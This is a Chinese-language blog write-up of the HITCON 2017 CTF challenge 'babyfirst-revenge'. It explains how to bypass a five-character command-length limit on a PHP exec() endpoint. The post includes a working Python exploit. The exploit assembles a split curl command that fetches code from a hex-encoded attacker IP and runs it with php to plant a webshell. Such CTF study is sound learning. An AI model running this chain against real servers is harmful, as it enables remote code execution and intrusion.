@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+
+
+
+ <html class="no-js"> 
+<head>
+    <title>HITCON 2017 babyfirst-revenge  &middot; BlankのBlog </title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta http-equiv="content-language" content="en-us" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="Blank">
+    <meta name="description" content="">
+    <link rel="shortcut icon" href="https://blank233.github.io/img/clover.png" type="image/x-icon" />
+    <meta name="generator" content="Hugo 0.37.1" />
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" href="https://blank233.github.io/css/smooth-scrollbar.css" />
+    <link rel="stylesheet" type="text/css" href="https://blank233.github.io/css/main.css" />
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/styles/tomorrow.min.css" />
+    
+
+    <style>
+        .posts li {
+            visibility: hidden;
+        }
+    </style>
+</head>
+<body>
+    
+    
+
+    <header>	
+	<div class="h-wrap">
+		
+		<h1 class="title"><a href="https://blank233.github.io/">BlankのBlog</a></h1>
+		
+	</div>
+</header>
+    
+    <div class="site-wrapper" id="full-wrapper">
+        <a name="top"></a>
+        <section class="single-wrap">
+            <article class="single-content" itemscope itemtype="//schema.org/BlogPosting">
+                <div class="feat">
+                    <h5 class="page-date">
+                    <time datetime="" itemprop="datePublished">
+                    20 May 2018
+                   
+                    </time>
+                    </h5>
+                </div>
+                <h1 class="page-title" itemprop="name headline">HITCON 2017 babyfirst-revenge</h1>
+                
+                
+                <h6>字数:457  Topic:<a href="https://blank233.github.io/topics/web">web</a>
+                Tag:<a href="https://blank233.github.io/tags/2018-05">2018-05</a></h6>
+
+                <div class="page-body" itemprop="articleBody">
+                    
+
+<p>题目源码</p>
+
+<pre><code>&lt;?php
+    $sandbox = '/www/sandbox/' . md5(&quot;orange&quot; . $_SERVER['REMOTE_ADDR']);
+    @mkdir($sandbox);
+    @chdir($sandbox);
+    if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) {
+        @exec($_GET['cmd']);
+    } else if (isset($_GET['reset'])) {
+        @exec('/bin/rm -rf ' . $sandbox);
+    }
+    highlight_file(__FILE__);
+</code></pre>
+
+<h3 id="0x01-从环境搭建开始">0x01    从环境搭建开始</h3>
+
+<p>使用的是ubuntu16.04，安装虚拟机，安装apache2+php+mysql，安装git，安装vim，精简系统等等。说一下在配置环境过程中遇到的问题：</p>
+
+<ul>
+<li>首先得建立/www/sandbox目录，linux创建文件(夹)时如果前置目录不存在会报错</li>
+</ul>
+
+<pre><code>  blank@blank-virtual-machine:~$ mkdir /test/test/test
+  mkdir: cannot create directory ‘/test/test/test’: No such file or directory
+</code></pre>
+
+<ul>
+<li>www-data由于没有实体，在sudoers下给予权限会无效</li>
+</ul>
+
+<pre><code>  blank@blank-virtual-machine:~$ cat /etc/passwd | grep www-data
+  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</code></pre>
+
+<p>解决方法，一是更换php执行者，一是更换路径的权限。</p>
+
+<h3 id="0x02-知识准备">0x02    知识准备</h3>
+
+<p>首先在解这道题目之前需要做些知识的铺垫</p>
+
+<ul>
+<li>IP的等价表示法</li>
+</ul>
+
+<p>我们常见的ip是由.为分隔符的4个十进制数表示，但其实上，在我们需要的时候，可以使用八进制，16进制，长整数来表示。转换代码</p>
+
+<pre><code>   #coding=utf-8
+   
+   ip = '192.168.98.133'
+   # 十六进制
+   print '0x' + ''.join([str(hex(int(i))[2:].zfill(2))for i in ip.split('.')])
+   # 长整数
+   print int(''.join([str(hex(int(i))[2:].zfill(2))for i in ip.split('.')]), 16)
+   # 八进制
+   print '0' + oct(int(''.join([str(hex(int(i))[2:].zfill(2))for i in ip.split('.')]), 16))
+</code></pre>
+
+<p>ip地址的“构造”是由32位二进制数组成的，比如192.168.98.133</p>
+
+<pre><code>   192		11000000
+   168		10101000
+   98		01100010
+   133		10000101
+</code></pre>
+
+<p>那么192.168.98.133的长整形就是32位2进制数的值</p>
+
+<pre><code>   &gt;&gt;&gt; print int(0b11000000101010000110001010000101)
+   3232260741
+</code></pre>
+
+<p>16进制表示就是0x+单个十进制数的16进制值，也可以使用累加法</p>
+
+<pre><code>   &gt;&gt;&gt; print hex(202*2**24+204*2**16+120*2**8+63)
+   0xcacc783fL
+   注：0xc0a86285才是16进制值，最后的L是由于int型数字大于2^31会自动转化成long，long转化为16进制时会在最后添加L
+</code></pre>
+
+<p>八进制表示可以用0+oct（长整形10进制）得到</p>
+
+<pre><code>   &gt;&gt;&gt; print oct(3232260741)
+   030052061205L
+   八进制为0030052061205，L与之前同理
+</code></pre>
+
+<p>测试</p>
+
+<pre><code>   D:\
+   λ ping 0xc0a86285
+   正在 Ping 192.168.98.133 具有 32 字节的数据:
+   来自 192.168.98.133 的回复: 字节=32 时间&lt;1ms TTL=64
+   来自 192.168.98.133 的回复: 字节=32 时间&lt;1ms TTL=64
+   
+   D:\
+   λ ping 3232260741
+   正在 Ping 192.168.98.133 具有 32 字节的数据:
+   来自 192.168.98.133 的回复: 字节=32 时间&lt;1ms TTL=64
+   来自 192.168.98.133 的回复: 字节=32 时间&lt;1ms TTL=64
+   
+   D:\
+   λ ping 0030052061205
+   正在 Ping 192.168.98.133 具有 32 字节的数据:
+   来自 192.168.98.133 的回复: 字节=32 时间&lt;1ms TTL=64
+   来自 192.168.98.133 的回复: 字节=32 时间&lt;1ms TTL=64
+   
+</code></pre>
+
+<ul>
+<li>利用续行符拆分命令</li>
+</ul>
+
+<pre><code>  blank@blank-virtual-machine:~$ l\
+  &gt; s
+  Desktop    Downloads         Music     Public     Videos
+  Documents  examples.desktop  Pictures  Templates
+</code></pre>
+
+<ul>
+<li>bash执行脚本时会忽略一行错误</li>
+</ul>
+
+<pre><code>  root@blank-virtual-machine:/www/sandbox/c7576a7ba5b8523ab4ac5f3d1ca02fcd# cat a
+  a
+  ls -t
+  root@blank-virtual-machine:/www/sandbox/c7576a7ba5b8523ab4ac5f3d1ca02fcd# sh a
+  a: 1: a: a: not found
+  d  c  b  a
+</code></pre>
+
+<ul>
+<li>*执行命令</li>
+</ul>
+
+<pre><code>  # touch echo rev type wc whereis which who  &amp;&amp; ls &amp;&amp; * 
+  echo  rev  type  wc  whereis  which  who
+  rev type wc whereis which who
+  # rm echo &amp;&amp; ls &amp;&amp; echo '1234'&gt;type &amp;&amp; *
+  rev  type  wc  whereis  which  who
+  4321
+  # rm rev &amp;&amp; ls &amp;&amp; *
+  type  wc  whereis  which  who
+  wc is /usr/bin/wc
+  whereis is /usr/bin/whereis
+  which is /usr/bin/which
+  who is /usr/bin/who
+  # rm type &amp;&amp; ls &amp;&amp; *
+  wc  whereis  which  who
+  0 0 0 whereis
+  0 0 0 which
+  0 0 0 who
+  0 0 0 total
+  ...
+</code></pre>
+
+<p>*会把ls下第一个名称作为命令执行</p>
+
+<p>*匹配时会列出所有符合条件的文件</p>
+
+<pre><code>  # touch echo rev type wc whereis which who
+  # echo w*
+  wc whereis which who
+</code></pre>
+
+<ul>
+<li>ls的排列顺序</li>
+</ul>
+
+<p><img src="https://p0.ssl.qhimg.com/t01c4dd700d11f91860.png" alt="ls排序方式" /></p>
+
+<h3 id="0x03-题目分析">0x03    题目分析</h3>
+
+<p>代码根据访问者的ip在/www/sandbox目录下建立一个目录，然后通过cmd传入执行的命令，但是长度小于等于5，使用reset重置环境。简单点说就是绕过5个字节限制getshell。</p>
+
+<p>思路：</p>
+
+<p>通过执行curl    192.168.98.133:8000&gt;A获取放在公网上的代码</p>
+
+<p>更改A里面的内容为一句话木马，使用php A执行</p>
+
+<p>遇到的问题：</p>
+
+<ul>
+<li>在使用curl + 长整形ip地址以及curl + 8进制地址时返回400，目前没解决，，，，</li>
+<li>16进制的ip地址无法满足ls的排序需求，所以需要使用ls -t</li>
+</ul>
+
+<p>具体操作：</p>
+
+<p>首先需要在一个文件里保存需要执行的ls -t&gt;g</p>
+
+<pre><code>&gt;dir
+&gt;sl
+&gt;ht-	# 使用ht是由于s显示在t前面
+&gt;g\&gt;
+*&gt;v		# v里面的内容为 g&gt;  ht-  sl
+</code></pre>
+
+<p>这时候v里面就得到了我们想要的语句逆序,使用*能执行命令的特性来改变顺序</p>
+
+<pre><code>&gt;rev
+*v&gt;x	# *v匹配的结果为rev v
+</code></pre>
+
+<p>此时x里即为需要的<strong>ls -ht &gt;g</strong> ，接下来只需要逆向构造curl即可</p>
+
+<pre><code>'&gt;\&gt;t',
+'&gt;00\\',
+'&gt;:80\\',
+'&gt;285\\',
+'&gt;86\\',
+'&gt;0a\\',
+'&gt;0xc\\',
+'&gt;l\ \\',
+'&gt;cur\\',
+# \\为python的转义，在实际url中还是一个\
+</code></pre>
+
+<p>最终的exp如下</p>
+
+<pre><code>#coding=utf-8
+
+import requests
+
+
+payload = [ '&gt;dir',
+			'&gt;sl',
+			'&gt;ht-',
+			'&gt;g\&gt;',
+			'*&gt;v',
+
+			'&gt;rev',
+			'*v&gt;x',
+			
+			# 删除过度文件
+			'rm d*',
+			'rm s*',
+			'rm h*',
+			'rm g*',
+			'rm v*',
+			'rm r*',
+			
+			# 拉取本地index.html
+			'&gt;\&gt;t',
+			'&gt;285\\',
+			'&gt;86\\',
+			'&gt;0a\\',
+			'&gt;0xc\\',
+			'&gt;l\ \\',
+			'&gt;cur\\',
+
+			'sh x',
+			'sh g',
+			'php t'
+]
+
+for i in payload:
+	url = 'http://192.168.98.133:8000/?cmd=' + i
+	r = requests.get(url)
+	print '%s' % r.status_code,url
+</code></pre>
+
+<p>然后蚁剑连接即可，关于字节限制在4，只需要更改本地url地址即可</p>
+
+<h3 id="0x04-参考">0x04    参考</h3>
+
+<p>这道题学到了很多东西，不仅限于题目，包括在搭建的过程中遇到的一些之前没注意到的小细节、linux系统的一些特性等等。感谢梅子酒师傅的git~</p>
+
+<p><a href="https://www.anquanke.com/post/id/87203">如何绕过四个字符限制getshell</a></p>
+
+<p><a href="http://momomoxiaoxi.com/2017/11/08/HITCON/">Blog of Xiaoxi</a></p>
+                    
+                </div>
+                <h6>千帆过尽，勿忘初心 <a href="#top"> UP </a></h6>
+                <div class="feat share">
+                </div>
+
+                
+            </article>
+        </section>
+        <footer>
+	
+</footer>
+
+    </div>
+
+    <div class="next-prev-arrows">
+        
+        
+            <a rel="prev" href="https://blank233.github.io/2018/05/08/%E6%9B%B4%E6%94%B9%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98/" id="prev">
+                 <span class="nav-title nav-title-prev">更改博客主题</span> &rarr;
+            </a>
+        
+    </div>
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://blank233.github.io/js/scrollreveal.min.js"></script>
+<script type='application/javascript' src='https://blank233.github.io/js/smooth-scrollbar.js'></script>
+<script src="https://blank233.github.io/js/baffle.min.js"></script>
+<script src="https://blank233.github.io/js/main.js"></script>
+
+
+
+
+
+
+<!-- Syntax highlighting -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+    <script src="https://blank233.github.io/js/chick.js"></script>
+</body>
+</html>
